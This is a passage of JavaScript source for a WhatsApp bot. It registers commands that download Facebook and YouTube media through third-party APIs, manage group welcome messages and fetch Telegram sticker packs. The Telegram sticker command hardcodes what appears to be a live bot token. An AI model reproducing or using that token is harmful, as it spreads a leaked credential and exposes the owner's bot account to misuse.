          caption: `🎬 *${title}*\n⏱️ *Duration:* ${duration}\n📊 *Quality:* ${quality}\n📦 *Size:* ${finalSize} MB\n${converted ? '🔄 *Re-encoded for compatibility*\n' : ''}\n✅ *Facebook Download Success*`
        });
      } catch (sendErr) {
        // If video send fails, send as document
        await sock.sendMessage(from, {
          document: finalBuffer,
          mimetype: 'video/mp4',
          fileName: `facebook_${Date.now()}.mp4`,
          caption: `🎬 *${title}*\n📊 *Quality:* ${quality}\n📦 *Size:* ${finalSize} MB\n\n✅ *Facebook Download Success (sent as document)*`
        });
      }

    } catch (error) {
      console.error('Facebook download error:', error);

      // Fallback: Prince API
      try {
        const princeUrl = 'https://api.princetechn.com/api/download/facebook';
        const fallbackRes = await fetch(`${princeUrl}?apikey=prince&url=${encodeURIComponent(url)}`);
        const fallbackData = await fallbackRes.json();

        let fallbackVideo = fallbackData.result?.video || fallbackData.result?.download_url || 
                            fallbackData.video || fallbackData.download_url || fallbackData.url;

        if (fallbackVideo) {
          const vRes = await fetch(fallbackVideo);
          let vBuf = Buffer.from(await vRes.arrayBuffer());
          if (vBuf.length > 5000) {
            // Try to convert fallback video too
            try {
              const { toMP4 } = require('../lib/converter');
              const converted = await toMP4(vBuf);
              if (converted && converted.length > 5000) vBuf = converted;
            } catch (convErr) {}

            try {
              await sock.sendMessage(from, { 
                video: vBuf, 
                mimetype: 'video/mp4',
                caption: `🎬 *Facebook Video (fallback)*\n\n✅ *Download Success*` 
              });
            } catch (sendErr) {
              await sock.sendMessage(from, {
                document: vBuf,
                mimetype: 'video/mp4',
                fileName: `facebook_fallback_${Date.now()}.mp4`,
                caption: `🎬 *Facebook Video (fallback)*\n\n✅ *Download Success*`
              });
            }
            return;
          }
        }
      } catch (fallbackErr) {}

      await sock.sendMessage(from, { 
        text: `⚠️ Download Error: ${error.message || 'Could not download video.'}\n\n💡 Try again or use a different link.` 
      });
    }
  }
});
register({
  name: 'facebookv2',
  aliases: ['fbv2', 'fb2', 'fbdl2'],
  category: 'DOWNLOADER',
  description: 'Download Facebook Videos with quality selection (HD/SD)',
  async execute({ sock, from, args, prefix, command }) {
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `📥 *Facebook Downloader v2*\n\nUsage: ${prefix}${command} <url> [quality]\nExample: ${prefix}${command} https://www.facebook.com/reel/402579285704851\n\n*Quality options:*\n• 1920p (HD - best)\n• 1280p (HD)\n• 960p (SD)\n• 640p (SD - smallest)\n\n*Examples:*\n${prefix}${command} https://www.facebook.com/reel/xxxxx 1920p\n${prefix}${command} https://fb.watch/xxxxx 640p\n\n*Note:* If no quality is specified, the highest available quality will be used.` 
      });
    }

    const url = args[0];
    let preferredQuality = '1920p';

    // Check if user specified a quality
    const qualityArg = args[1] || '';
    const validQualities = ['1920p', '1280p', '960p', '640p', '1080p', '720p', '480p', '360p'];
    if (validQualities.includes(qualityArg.toLowerCase())) {
      preferredQuality = qualityArg.toLowerCase();
    }

    if (!url.includes('facebook.com') && !url.includes('fb.watch')) {
      return await sock.sendMessage(from, { 
        text: `❌ Invalid URL. Please provide a valid Facebook link.` 
      });
    }

    await sock.sendMessage(from, { text: `⏳ Processing Facebook video...` });

    try {
      // Primary: GiftedTech API v2
      const response = await fetch(
        `https://api.giftedtech.co.ke/api/download/facebookv2?apikey=gifted&url=${encodeURIComponent(url)}`,
        {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        }
      );

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // Extract video data
      let title = data.result?.title || 'Facebook Video';
      let duration = data.result?.duration || 'N/A';
      let thumbnail = data.result?.thumbnail || null;
      let uploader = data.result?.uploader || 'Unknown';
      let viewCount = data.result?.view_count || 'N/A';
      let links = data.result?.links || [];

      if (!links || links.length === 0) {
        throw new Error("Could not extract video links from API response.");
      }

      // Sort links by quality (highest first)
      const qualityOrder = ['1920p', '1280p', '1080p', '960p', '720p', '640p', '480p', '360p'];
      links.sort((a, b) => {
        return qualityOrder.indexOf(a.quality) - qualityOrder.indexOf(b.quality);
      });

      // Find the best available quality
      let selectedLink = null;
      let selectedQuality = '';

      // Try to match user's preferred quality
      for (const link of links) {
        if (link.quality === preferredQuality) {
          selectedLink = link;
          selectedQuality = link.quality;
          break;
        }
      }

      // If preferred quality not found, use the highest available
      if (!selectedLink && links.length > 0) {
        selectedLink = links[0];
        selectedQuality = selectedLink.quality || 'HD';
      }

      if (!selectedLink || !selectedLink.url) {
        throw new Error("Could not find a valid video link.");
      }

      const videoUrl = selectedLink.url;

      // Format view count
      const viewCountFormatted = viewCount !== 'N/A' ? new Intl.NumberFormat().format(viewCount) : 'N/A';

      // Send thumbnail if available
      if (thumbnail) {
        try {
          await sock.sendMessage(from, {
            image: { url: thumbnail },
            caption: `🎬 *${title}*\n👤 *Uploader:* ${uploader}\n⏱️ *Duration:* ${duration}\n📊 *Views:* ${viewCountFormatted}\n📊 *Quality:* ${selectedQuality}\n\n⬇️ *Downloading video...*`
          });
        } catch (thumbErr) {
          await sock.sendMessage(from, { 
            text: `🎬 *${title}*\n👤 *Uploader:* ${uploader}\n⏱️ *Duration:* ${duration}\n📊 *Views:* ${viewCountFormatted}\n📊 *Quality:* ${selectedQuality}\n\n⬇️ *Downloading video...*` 
          });
        }
      }

      // Download and send the video
      const videoResponse = await fetch(videoUrl, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (!videoResponse.ok) {
        throw new Error(`Video download failed: ${videoResponse.status}`);
      }

      const videoBuffer = Buffer.from(await videoResponse.arrayBuffer());

      if (videoBuffer.length < 5000) {
        throw new Error("Downloaded file is too small. The link may be invalid.");
      }

      const fileSizeMB = (videoBuffer.length / 1024 / 1024).toFixed(1);

      // Build caption with available qualities
      let qualityList = '';
      links.slice(0, 4).forEach((link) => {
        const check = link.quality === selectedQuality ? '✅' : '•';
        qualityList += `${check} ${link.quality}\n`;
      });

      const caption = `🎬 *${title}*\n👤 *Uploader:* ${uploader}\n⏱️ *Duration:* ${duration}\n📊 *Views:* ${viewCountFormatted}\n📦 *Size:* ${fileSizeMB} MB\n📊 *Quality:* ${selectedQuality}\n\n📥 *Available Qualities:*\n${qualityList}\n\n✅ *Facebook Download Success*\n\n💡 Use ${prefix}${command} <url> <quality> to select quality.`;

      try {
        await sock.sendMessage(from, {
          video: videoBuffer,
          mimetype: 'video/mp4',
          caption: caption
        });
      } catch (sendErr) {
        await sock.sendMessage(from, {
          document: videoBuffer,
          mimetype: 'video/mp4',
          fileName: `facebook_${Date.now()}.mp4`,
          caption: `🎬 *${title}*\n📊 *Quality:* ${selectedQuality}\n📦 *Size:* ${fileSizeMB} MB`
        });
      }

    } catch (error) {
      console.error('Facebook v2 download error:', error);

      // Fallback: Prince API
      try {
        const princeUrl = 'https://api.princetechn.com/api/download/facebook';
        const fallbackRes = await fetch(`${princeUrl}?apikey=prince&url=${encodeURIComponent(url)}`);
        const fallbackData = await fallbackRes.json();

        let fallbackVideo = fallbackData.result?.video || fallbackData.result?.download_url || 
                            fallbackData.video || fallbackData.download_url || fallbackData.url;
        let fallbackTitle = fallbackData.result?.title || fallbackData.title || 'Facebook Video';

        if (fallbackVideo) {
          const vRes = await fetch(fallbackVideo);
          const vBuf = Buffer.from(await vRes.arrayBuffer());
          if (vBuf.length > 5000) {
            return await sock.sendMessage(from, { 
              video: vBuf, 
              mimetype: 'video/mp4',
              caption: `🎬 *${fallbackTitle}*\n\n✅ *Facebook Download (fallback)*` 
            });
          }
        }
      } catch (fallbackErr) {}

      // Fallback: GiftedTech v1
      try {
        const v1Url = 'https://api.giftedtech.co.ke/api/download/facebook';
        const v1Res = await fetch(`${v1Url}?apikey=gifted&url=${encodeURIComponent(url)}`);
        const v1Data = await v1Res.json();

        let v1Video = v1Data.result?.hd_video || v1Data.result?.sd_video || v1Data.result?.video || v1Data.video;

        if (v1Video) {
          const vRes = await fetch(v1Video);
          const vBuf = Buffer.from(await vRes.arrayBuffer());
          if (vBuf.length > 5000) {
            return await sock.sendMessage(from, { 
              video: vBuf, 
              mimetype: 'video/mp4',
              caption: '✅ *Facebook Download (fallback)*' 
            });
          }
        }
      } catch (v1Err) {}

      await sock.sendMessage(from, { 
        text: `⚠️ Download Error: ${error.message || 'Could not download video.'}\n\n💡 Make sure the URL is valid and the video is public.` 
      });
    }
  }
});
register({
  name: 'getid',
  aliases: ['getjid', 'getchannelid', 'getnewsletter', 'channelid'],
  category: 'INFO',
  description: 'Get the newsletter ID from a forwarded channel message',
  async execute({ sock, from, msg, quoted, args, prefix, command }) {
    const target = quoted || msg;

    const contextInfo = target?.message?.extendedTextMessage?.contextInfo ||
                        target?.message?.imageMessage?.contextInfo ||
                        target?.message?.videoMessage?.contextInfo ||
                        target?.message?.documentMessage?.contextInfo ||
                        target?.message?.audioMessage?.contextInfo ||
                        target?.message?.stickerMessage?.contextInfo;

    const newsletterJid = contextInfo?.newsletterJid || 
                          contextInfo?.forwardedNewsletterMessageInfo?.newsletterJid;

    if (newsletterJid) {
      await sock.sendMessage(from, { 
        text: newsletterJid 
      });
    } else {
      await sock.sendMessage(from, { 
        text: 'No newsletter ID found. Reply to a forwarded channel message.' 
      });
    }
  }
});
// -------------------- WELCOME / GOODBYE --------------------

register({
  name: 'welcome',
  category: 'GROUP-ADMIN',
  description: 'Toggle welcome messages (on/off)',
  async execute({ sock, from, sender, args, isGroup, msg }) {
    if (!isGroup) return sock.sendMessage(from, { text: '⚠️ Group only!' });
    const isAdmin = await requireAdminOrOwner({ sock, from, sender, isGroup, msg });
    if (!isAdmin) return;
    const state = args[0]?.toLowerCase();
    if (!state || !['on', 'off'].includes(state)) {
      return sock.sendMessage(from, { text: `📋 Usage: welcome on | off` });
    }
    setGroupSetting(from, 'welcome', state === 'on');
    await sock.sendMessage(from, { text: `✅ Welcome ${state === 'on' ? 'enabled' : 'disabled'}.` });
  }
});

register({
  name: 'goodbye',
  category: 'GROUP-ADMIN',
  description: 'Toggle goodbye messages (on/off)',
  async execute({ sock, from, sender, args, isGroup, msg }) {
    if (!isGroup) return sock.sendMessage(from, { text: '⚠️ Group only!' });
    const isAdmin = await requireAdminOrOwner({ sock, from, sender, isGroup, msg });
    if (!isAdmin) return;
    const state = args[0]?.toLowerCase();
    if (!state || !['on', 'off'].includes(state)) {
      return sock.sendMessage(from, { text: `📋 Usage: goodbye on | off` });
    }
    setGroupSetting(from, 'goodbye', state === 'on');
    await sock.sendMessage(from, { text: `✅ Goodbye ${state === 'on' ? 'enabled' : 'disabled'}.` });
  }
});

register({
  name: 'setwelcome',
  category: 'GROUP-ADMIN',
  description: 'Set custom welcome message (@user, @group)',
  async execute({ sock, from, sender, args, isGroup, msg }) {
    if (!isGroup) return sock.sendMessage(from, { text: '⚠️ Group only!' });
    const isAdmin = await requireAdminOrOwner({ sock, from, sender, isGroup, msg });
    if (!isAdmin) return;
    const msgText = args.join(' ');
    if (!msgText) return sock.sendMessage(from, { text: `📝 Usage: setwelcome <message> (use @user, @group)` });
    setGroupSetting(from, 'welcomeMessage', msgText);
    await sock.sendMessage(from, { text: `✅ Welcome message set.` });
  }
});

register({
  name: 'setgoodbye',
  category: 'GROUP-ADMIN',
  description: 'Set custom goodbye message (@user, @group)',
  async execute({ sock, from, sender, args, isGroup, msg }) {
    if (!isGroup) return sock.sendMessage(from, { text: '⚠️ Group only!' });
    const isAdmin = await requireAdminOrOwner({ sock, from, sender, isGroup, msg });
    if (!isAdmin) return;
    const msgText = args.join(' ');
    if (!msgText) return sock.sendMessage(from, { text: `📝 Usage: setgoodbye <message> (use @user)` });
    setGroupSetting(from, 'goodbyeMessage', msgText);
    await sock.sendMessage(from, { text: `✅ Goodbye message set.` });
  }
});

// 13. Group info
register({
  name: 'groupinfo',
  aliases: ['gcinfo', 'group'],
  category: 'INFO',
  description: 'Show group information',
  async execute({ sock, from, isGroup }) {
    if (!isGroup) return sock.sendMessage(from, { text: '⚠️ Group only!' });
    const meta = await sock.groupMetadata(from);
    const admins = meta.participants.filter(p => p.admin);
    const total = meta.participants.length;
    let msg = `📊 *Group Info*\n\n`;
    msg += `📛 *Name:* ${meta.subject}\n`;
    msg += `👥 *Members:* ${total}\n`;
    msg += `👑 *Admins:* ${admins.length}\n`;
    msg += `🆔 *JID:* ${from}\n`;
    msg += `📅 *Created:* ${new Date(meta.creation * 1000).toLocaleDateString()}`;
    await sock.sendMessage(from, { text: msg });
  }
});
register({
  name: 'ytmp3',
  aliases: ['yt3', 'ytmusic', 'ytaudio'],
  category: 'DOWNLOADER',
  description: 'Download YouTube videos as MP3 audio with quality selection',
  async execute({ sock, from, args, prefix, command }) {
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `🎵 *YouTube MP3 Downloader*\n\nUsage: ${prefix}${command} <url> [quality]\nExample: ${prefix}${command} https://youtu.be/qF-JLqKtr2Q\n\n*Quality options:*\n• 320kbps (best)\n• 128kbps (default)\n\n*Examples:*\n${prefix}${command} https://youtu.be/xxxxx 320\n${prefix}${command} https://youtu.be/xxxxx 128\n\n*Note:* Download URL expires in 10 minutes.` 
      });
    }

    const url = args[0];
    let quality = '128'; // Default quality

    // Check if user specified quality
    const qualityArg = args[1] || '';
    if (qualityArg === '320' || qualityArg === '320kbps') {
      quality = '320';
    }

    if (!url.includes('youtube.com') && !url.includes('youtu.be')) {
      return await sock.sendMessage(from, { 
        text: `❌ Invalid URL. Please provide a valid YouTube link.` 
      });
    }

    await sock.sendMessage(from, { text: `⏳ Processing YouTube audio...` });

    try {
      // Primary: GiftedTech API
      const response = await fetch(
        `https://api.giftedtech.co.ke/api/download/ytmp3?apikey=gifted&url=${encodeURIComponent(url)}&quality=${quality}kbps`,
        {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        }
      );

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // Extract data
      let title = data.result?.title || 'YouTube Audio';
      let thumbnail = data.result?.thumbnail || null;
      let downloadUrl = data.result?.download_url || null;
      let format = data.result?.format || 'mp3';
      let qualityReturned = data.result?.quality || `${quality}kbps`;
      let availableQualities = data.result?.availableQualities || [];
      let message = data.result?.message || '';

      if (!downloadUrl) {
        throw new Error("Could not extract download URL from API response.");
      }

      // Send thumbnail if available
      if (thumbnail) {
        try {
          await sock.sendMessage(from, {
            image: { url: thumbnail },
            caption: `🎵 *${title}*\n📊 *Quality:* ${qualityReturned}\n📦 *Format:* ${format}\n${message ? `\n${message}` : ''}\n\n⬇️ *Downloading audio...*`
          });
        } catch (thumbErr) {
          await sock.sendMessage(from, { 
            text: `🎵 *${title}*\n📊 *Quality:* ${qualityReturned}\n📦 *Format:* ${format}\n${message ? `\n${message}` : ''}\n\n⬇️ *Downloading audio...*` 
          });
        }
      }

      // Download the audio
      const audioResponse = await fetch(downloadUrl, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (!audioResponse.ok) {
        throw new Error(`Audio download failed: ${audioResponse.status}`);
      }

      const audioBuffer = Buffer.from(await audioResponse.arrayBuffer());

      if (audioBuffer.length < 5000) {
        throw new Error("Downloaded file is too small. The link may be invalid.");
      }

      const fileSizeMB = (audioBuffer.length / 1024 / 1024).toFixed(1);

      // Build available qualities message
      let qualityList = '';
      if (availableQualities.length > 0) {
        qualityList = availableQualities.map(q => `${q}kbps`).join(', ');
      }

      const caption = `🎵 *${title}*\n📊 *Quality:* ${qualityReturned}\n📦 *Format:* ${format}\n📦 *Size:* ${fileSizeMB} MB\n${qualityList ? `📥 *Available:* ${qualityList}` : ''}\n\n✅ *Download Success*\n${message ? `\n⚠️ ${message}` : ''}`;

      // Try to send as audio
      try {
        await sock.sendMessage(from, {
          audio: audioBuffer,
          mimetype: 'audio/mpeg',
          fileName: `${title.replace(/[^a-zA-Z0-9]/g, '_')}.${format}`,
          caption: caption,
          ptt: false
        });
      } catch (sendErr) {
        // Fallback: send as document
        await sock.sendMessage(from, {
          document: audioBuffer,
          mimetype: 'audio/mpeg',
          fileName: `${title.replace(/[^a-zA-Z0-9]/g, '_')}.${format}`,
          caption: caption
        });
      }

    } catch (error) {
      console.error('YouTube MP3 download error:', error);

      // Fallback: OmegaTech API
      try {
        const omegaUrl = 'https://omegatech-api.dixonomega.tech/api/download/play';
        const fallbackRes = await fetch(`${omegaUrl}?url=${encodeURIComponent(url)}`);
        const fallbackData = await fallbackRes.json();

        let fallbackAudio = fallbackData.download_url || fallbackData.download || fallbackData.url;
        let fallbackTitle = fallbackData.title || 'YouTube Audio';

        if (fallbackAudio) {
          const aRes = await fetch(fallbackAudio);
          const aBuf = Buffer.from(await aRes.arrayBuffer());
          if (aBuf.length > 5000) {
            return await sock.sendMessage(from, {
              audio: aBuf,
              mimetype: 'audio/mpeg',
              fileName: `${fallbackTitle}.mp3`,
              caption: `🎵 *${fallbackTitle}*\n\n✅ *YouTube MP3 Download (fallback)*`
            });
          }
        }
      } catch (fallbackErr) {}

      // Fallback: Prince API
      try {
        const princeUrl = 'https://api.princetechn.com/api/download/ytmp3';
        const princeRes = await fetch(`${princeUrl}?apikey=prince&url=${encodeURIComponent(url)}`);
        const princeData = await princeRes.json();

        let princeAudio = princeData.result?.download_url || princeData.result?.url || princeData.download_url || princeData.url;
        let princeTitle = princeData.result?.title || princeData.title || 'YouTube Audio';

        if (princeAudio) {
          const aRes = await fetch(princeAudio);
          const aBuf = Buffer.from(await aRes.arrayBuffer());
          if (aBuf.length > 5000) {
            return await sock.sendMessage(from, {
              audio: aBuf,
              mimetype: 'audio/mpeg',
              fileName: `${princeTitle}.mp3`,
              caption: `🎵 *${princeTitle}*\n\n✅ *YouTube MP3 Download (fallback)*`
            });
          }
        }
      } catch (princeErr) {}

      await sock.sendMessage(from, { 
        text: `⚠️ Download Error: ${error.message || 'Could not download audio.'}\n\n💡 Make sure the URL is valid and try again.` 
      });
    }
  }
});
register({
  name: 'tgsticker',
  aliases: ['tgstickers', 'tgs', 'teles'],
  category: 'TOOLS',
  description: 'Download stickers from Telegram sticker packs',
  async execute({ sock, from, args, prefix, command }) {
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `🖼️ *Telegram Sticker Downloader*\n\nUsage: ${prefix}${command} <url>\nExample: ${prefix}${command} https://t.me/addstickers/StickerPackName\n\n*Supports:*\n• t.me/addstickers/... (sticker packs)\n• t.me/sticker/... (individual stickers)\n\n*Note:* Sends up to 10 stickers from the pack.` 
      });
    }

    const url = args[0];

    // Check if it's a Telegram sticker link
    if (!url.includes('t.me/addstickers') && !url.includes('t.me/sticker')) {
      return await sock.sendMessage(from, { 
        text: `❌ Invalid URL. Please provide a Telegram sticker link.\nExample: https://t.me/addstickers/StickerPackName` 
      });
    }

    // ==========================================================
    // 🛑 REPLACE THIS WITH YOUR TELEGRAM BOT TOKEN
    // Get token from @BotFather on Telegram
    // ==========================================================
    const BOT_TOKEN = '8837997340:AAFotvN_C0AqVzHdMzrtyWDhTbGhbWolaGw';
    // ==========================================================

    if (BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN_HERE') {
      return await sock.sendMessage(from, { 
        text: `❌ Bot token not configured. Please set your token in the command.` 
      });
    }

    // Extract pack name from URL
    let packName = '';
    if (url.includes('t.me/addstickers/')) {
      packName = url.split('t.me/addstickers/')[1].split('?')[0].split('#')[0];
    } else if (url.includes('t.me/sticker')) {
      const match = url.match(/t\.me\/sticker\/([^\s?]+)/);
      if (match) packName = match[1];
    }

    if (!packName) {
      return await sock.sendMessage(from, { 
        text: `❌ Could not extract sticker pack name from URL.` 
      });
    }

    await sock.sendMessage(from, { text: `⏳ Fetching sticker pack: *${packName}*...` });

    try {
      // Use Telegram Bot API to get sticker set
      const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/getStickerSet?name=${encodeURIComponent(packName)}`;
      const response = await fetch(apiUrl, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      if (!data.ok) {
        throw new Error(data.description || 'Sticker pack not found.');
      }

      const stickerSet = data.result;
      const stickers = stickerSet.stickers || [];
      const packTitle = stickerSet.title || packName;

      if (stickers.length === 0) {
        return await sock.sendMessage(from, { 
          text: `❌ No stickers found in this pack.` 
        });
      }

      const maxStickers = Math.min(stickers.length, 10);

      await sock.sendMessage(from, { 
        text: `🖼️ *${packTitle}*\n📊 *Total:* ${stickers.length} stickers\n📤 *Sending:* ${maxStickers} stickers\n\n⬇️ Downloading...` 
      });

      let sentCount = 0;

      for (let i = 0; i < maxStickers; i++) {
        try {
          const sticker = stickers[i];
          const fileId = sticker.file_id;

          // Get file path from Telegram
          const fileRes = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`,
            {
              headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
              }
            }
          );

          if (!fileRes.ok) continue;

          const fileData = await fileRes.json();

          if (!fileData.ok) continue;

          const filePath = fileData.result?.file_path;
          if (!filePath) continue;

          // Download the sticker file
          const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${filePath}`;
          const stickerRes = await fetch(fileUrl, {
            headers: {
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
          });

          if (!stickerRes.ok) continue;

          const stickerBuffer = Buffer.from(await stickerRes.arrayBuffer());

          if (stickerBuffer.length < 100) continue;

          // Determine if it's a sticker (webp) or image
          const isWebp = filePath.endsWith('.webp');

          if (isWebp) {
            await sock.sendMessage(from, {
              sticker: stickerBuffer,
              caption: `🖼️ ${i+1}/${maxStickers}`
            });
          } else {
            await sock.sendMessage(from, {
              image: stickerBuffer,
              caption: `🖼️ ${i+1}/${maxStickers}`
            });
          }

          sentCount++;
          await new Promise(r => setTimeout(r, 300));

        } catch (stickerErr) {
          console.warn(`Sticker ${i+1} error:`, stickerErr.message);
        }
      }

      if (sentCount === 0) {
        await sock.sendMessage(from, { 
          text: `❌ Failed to download any stickers.\n\n💡 The sticker pack may be private or unavailable.` 
        });
      } else {
        await sock.sendMessage(from, { 
          text: `✅ Downloaded and sent *${sentCount}*/${maxStickers} stickers from *${packTitle}*` 
        });
      }

    } catch (error) {
      console.error('Telegram sticker error:', error);

      // Fallback: Try alternative method
      try {
        const fallbackUrl = `https://t.me/addstickers/${packName}`;
        const fallbackRes = await fetch(fallbackUrl, {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        });

        if (fallbackRes.ok) {
          const html = await fallbackRes.text();
          const urlMatches = html.match(/https?:\/\/[^\s"']+\.(webp|png|jpg)/gi) || [];
          const uniqueImages = [...new Set(urlMatches)];

          if (uniqueImages.length > 0) {
            const maxFallback = Math.min(uniqueImages.length, 5);
            let fallbackCount = 0;
            for (let i = 0; i < maxFallback; i++) {
              try {
                const imgUrl = uniqueImages[i];
                const imgRes = await fetch(imgUrl);
                if (imgRes.ok) {
                  const imgBuf = Buffer.from(await imgRes.arrayBuffer());
                  if (imgBuf.length > 1000) {
                    await sock.sendMessage(from, {
                      image: imgBuf,
                      caption: `🖼️ ${i+1}/${maxFallback} (fallback)`
                    });
                    fallbackCount++;
                    await new Promise(r => setTimeout(r, 400));
                  }
                }
              } catch (imgErr) {}
            }
            if (fallbackCount > 0) {
              return await sock.sendMessage(from, { 
                text: `✅ Downloaded *${fallbackCount}* images (fallback method).` 
              });
            }
          }
        }
      } catch (fallbackErr) {
        console.warn('Fallback failed:', fallbackErr.message);
      }

      await sock.sendMessage(from, { 
        text: `⚠️ Download Error: ${error.message || 'Could not fetch stickers.'}\n\n💡 Make sure the sticker pack exists and is public.` 
      });
    }
  }
});
register({
  name: 'ytmp4',
  aliases: ['ytv', 'youtube', 'ytdl', 'youtubedl'],
  category: 'DOWNLOADER',
  description: 'Download YouTube videos with quality selection',
  async execute({ sock, from, args, prefix, command }) {
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `🎬 *YouTube MP4 Downloader*\n\nUsage: ${prefix}${command} <url> [quality]\nExample: ${prefix}${command} https://youtu.be/wdJrTQJh1ZQ\n\n*Quality options:*\n• 1080p (best)\n• 720p (default)\n• 480p\n• 360p\n• 240p\n• 144p\n\n*Examples:*\n${prefix}${command} https://youtu.be/xxxxx 1080p\n${prefix}${command} https://youtu.be/xxxxx 720p\n\n*Note:* Download URL expires in 10 minutes.` 
      });
    }

    const url = args[0];
    let quality = '720p'; // Default quality

    // Check if user specified quality
    const qualityArg = (args[1] || '').toLowerCase();
    const validQualities = ['1080p', '720p', '480p', '360p', '240p', '144p'];
    if (validQualities.includes(qualityArg)) {
      quality = qualityArg;
    }

    if (!url.includes('youtube.com') && !url.includes('youtu.be')) {
      return await sock.sendMessage(from, { 
        text: `❌ Invalid URL. Please provide a valid YouTube link.` 
      });
    }

    await sock.sendMessage(from, { text: `⏳ Processing YouTube video... (${quality})` });

    try {
      // Primary: GiftedTech API
      const response = await fetch(
        `https://api.giftedtech.co.ke/api/download/ytmp4?apikey=gifted&url=${encodeURIComponent(url)}&quality=${quality}`,
        {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        }
      );

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // Extract data
      let title = data.result?.title || 'YouTube Video';
      let thumbnail = data.result?.thumbnail || null;
      let downloadUrl = data.result?.download_url || null;
      let format = data.result?.format || 'mp4';
      let qualityReturned = data.result?.quality || quality;
      let availableQualities = data.result?.availableQualities || [];
      let message = data.result?.message || '';

      if (!downloadUrl) {
        throw new Error("Could not extract download URL from API response.");
      }

      // Send thumbnail if available
      if (thumbnail) {
        try {
          await sock.sendMessage(from, {
            image: { url: thumbnail },
            caption: `🎬 *${title}*\n📊 *Quality:* ${qualityReturned}\n📦 *Format:* ${format}\n${message ? `\n${message}` : ''}\n\n⬇️ *Downloading video...*`
          });
        } catch (thumbErr) {
          await sock.sendMessage(from, { 
            text: `🎬 *${title}*\n📊 *Quality:* ${qualityReturned}\n📦 *Format:* ${format}\n${message ? `\n${message}` : ''}\n\n⬇️ *Downloading video...*` 
          });
        }
      }

      // Download the video
      const videoResponse = await fetch(downloadUrl, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (!videoResponse.ok) {
        throw new Error(`Video download failed: ${videoResponse.status}`);
      }

      const videoBuffer = Buffer.from(await videoResponse.arrayBuffer());

      if (videoBuffer.length < 5000) {
        throw new Error("Downloaded file is too small. The link may be invalid.");
      }

      const fileSizeMB = (videoBuffer.length / 1024 / 1024).toFixed(1);

      // Build available qualities message
      let qualityList = '';
      if (availableQualities.length > 0) {
        qualityList = availableQualities.map(q => `${q}p`).join(', ');
      }

      const caption = `🎬 *${title}*\n📊 *Quality:* ${qualityReturned}\n📦 *Format:* ${format}\n📦 *Size:* ${fileSizeMB} MB\n${qualityList ? `📥 *Available:* ${qualityList}` : ''}\n\n✅ *Download Success*\n${message ? `\n⚠️ ${message}` : ''}`;

      // Try to send as video
      try {
        await sock.sendMessage(from, {
          video: videoBuffer,
          mimetype: 'video/mp4',
          caption: caption
        });
      } catch (sendErr) {
        // Fallback: send as document
        await sock.sendMessage(from, {
          document: videoBuffer,
          mimetype: 'video/mp4',
          fileName: `${title.replace(/[^a-zA-Z0-9]/g, '_')}.${format}`,
          caption: caption
        });
      }

    } catch (error) {
      console.error('YouTube MP4 download error:', error);

      // Fallback: OmegaTech API
      try {
        const omegaUrl = 'https://omegatech-api.dixonomega.tech/api/download/ytmp4';
        const fallbackRes = await fetch(`${omegaUrl}?url=${encodeURIComponent(url)}&quality=${quality}`);
        const fallbackData = await fallbackRes.json();

        let fallbackVideo = fallbackData.download_url || fallbackData.url || fallbackData.video;
        let fallbackTitle = fallbackData.title || 'YouTube Video';

        if (fallbackVideo) {
          const vRes = await fetch(fallbackVideo);
          const vBuf = Buffer.from(await vRes.arrayBuffer());
          if (vBuf.length > 5000) {
            return await sock.sendMessage(from, {
              video: vBuf,
              mimetype: 'video/mp4',
              caption: `🎬 *${fallbackTitle}*\n\n✅ *YouTube Download (fallback)*`
            });
          }
        }
      } catch (fallbackErr) {}

      // Fallback: Prince API
      try {
        const princeUrl = 'https://api.princetechn.com/api/download/ytmp4';
        const princeRes = await fetch(`${princeUrl}?apikey=prince&url=${encodeURIComponent(url)}&quality=${quality}`);
        const princeData = await princeRes.json();

        let princeVideo = princeData.result?.download_url || princeData.result?.url || princeData.download_url || princeData.url;
        let princeTitle = princeData.result?.title || princeData.title || 'YouTube Video';

        if (princeVideo) {
          const vRes = await fetch(princeVideo);
          const vBuf = Buffer.from(await vRes.arrayBuffer());
          if (vBuf.length > 5000) {
            return await sock.sendMessage(from, {
              video: vBuf,
              mimetype: 'video/mp4',
              caption: `🎬 *${princeTitle}*\n\n✅ *YouTube Download (fallback)*`
            });
          }
        }
      } catch (princeErr) {}

      // Fallback: Try yt-search with GiftedTech
      try {
        const yts = require('yt-search');
        const searchResults = await yts(url);
        if (searchResults && searchResults.videos && searchResults.videos.length > 0) {
          const target = searchResults.videos[0];
          const ytUrl = target.url;

          const giftedRes = await fetch(
